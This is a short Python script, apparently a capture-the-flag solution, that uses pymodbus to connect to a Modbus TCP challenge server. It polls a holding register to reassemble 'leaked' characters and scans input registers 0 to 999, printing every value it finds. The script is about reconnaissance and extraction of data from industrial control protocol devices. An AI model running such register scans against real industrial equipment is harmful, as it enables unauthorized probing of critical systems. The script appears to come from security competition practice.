#!/usr/bin/env python3

from pymodbus.client.sync import ModbusTcpClient as ModbusClient
from pymodbus.register_read_message import ReadHoldingRegistersRequest

client = ModbusClient("0.cloud.chals.io", port=20988)
 
client.connect()


def read_sth(client):
	leaked = []
	rr = client.read_holding_registers(0,1)
	while rr:
		rr = client.read_holding_registers(0,1)
		print(f'data: {hex(rr.registers[0])}')
		leaked.append(rr.registers[0])
		print(''.join([chr(x) for x in leaked]))

def read_sth_2(client):
	leaked = []
	for x in range(1000):
		rr = client.read_input_registers(x,1)
		try:
			print(f'adress {x} data: {hex(rr.registers[0])}')
		except:
			continue

read_sth_2(client)
